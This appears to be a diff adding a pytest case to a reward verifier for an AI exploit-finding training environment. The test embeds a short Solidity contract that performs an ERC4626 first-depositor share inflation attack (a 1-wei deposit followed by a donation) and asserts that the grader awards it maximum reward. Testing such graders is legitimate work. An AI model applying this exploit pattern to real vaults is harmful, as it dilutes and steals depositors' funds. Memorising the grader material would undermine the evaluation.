@@ -171,6 +171,56 @@ def test_verify_real_reentrancy_exploit():
     assert "SUCCESS: Invariant breached" in verdict.feedback
 
 
+def test_verify_erc4626_inflation_exploit():
+    """
+    Ensures that an ERC4626 first-depositor share inflation exploit
+    breaches the depositor equity invariant and receives maximum RLVR reward.
+    """
+    inflation_code = """
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.20;
+    import "../src/ERC4626Vault.sol";
+
+    contract ExploitModule {
+        ERC4626Vault public vault;
+        constructor(address _target) { vault = ERC4626Vault(payable(_target)); }
+        function runExploit() external payable {
+            vault.deposit{value: 1}();
+            payable(address(vault)).transfer(msg.value - 1);
+        }
+        receive() external payable {}
+    }
+    """
+    payload = ExploitPayload(
+        target_name="ERC4626Vault",
+        hypothesis=AttackHypothesis(
+            vulnerability_type="FirstDepositorShareInflation",
+            reasoning_trace="No virtual offset in convertToShares leads to zero-share deposit dilution",
+            attack_vector="Deposit 1 wei then donate 5 ether to skew share exchange rate"
+        ),
+        test_code=inflation_code,
+        test_filename="ExploitModule.sol"
+    )
+
+    result = ExecutionResult(
+        return_code=0,
+        stdout="[PASS] testExploit() (gas: 89000)",
+        stderr="",
+        execution_time_sec=0.64,
+        timed_out=False,
+        invariant_violated=True,
+        test_status="Success",
+        decoded_logs=["[INVARIANT_BREACHED:SHARE_INFLATION_DEPOSITOR_DILUTION]"]
+    )
+
+    verdict = evaluate_execution_trace(payload, result)
+
+    assert verdict.is_verified is True
+    assert verdict.reward_score == config.REWARD_INVARIANT_BREACH
+    assert "SUCCESS: Invariant breached" in verdict.feedback
+
+
+
 # =============================================================================
 # 4. TEST TIMEOUT HANDLING
 # =============================================================================
